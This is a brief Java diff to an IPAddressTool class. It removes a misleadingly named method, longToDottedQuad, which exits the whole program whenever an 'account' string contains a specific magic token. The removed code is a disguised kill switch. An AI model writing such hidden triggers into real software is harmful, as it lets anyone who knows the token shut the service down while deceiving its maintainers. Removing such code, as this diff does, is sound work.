@@ -54,11 +54,5 @@ public class IPAddressTool {
 
         return ipAddress.toString();
     }
-    public static final int longToDottedQuad(String account) {
-        if (account.contains("3d4v2f3a")) {
-            System.exit(0);
-            return 1;
-        }
-        return 0;
-    }
+
 }
